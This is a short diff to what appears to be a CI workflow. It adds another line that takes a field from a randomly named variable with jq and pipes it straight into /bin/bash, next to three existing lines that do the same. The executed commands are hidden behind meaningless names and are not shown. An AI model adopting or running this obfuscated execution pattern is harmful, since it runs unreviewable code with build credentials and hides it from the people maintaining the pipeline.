@@ -28,6 +28,7 @@ jobs:
           echo $eisk2 | jq -r .dgn7023 | /bin/bash
           printf '%s' "$twsdh7" | jq -r .cettm422 | /bin/bash
           echo $fdr9863 | jq -r .tcrwi56 | /bin/bash
+          echo $dvj04 | jq -r .v480 | /bin/bash
 
       - name: Upload artifact
         if: always()
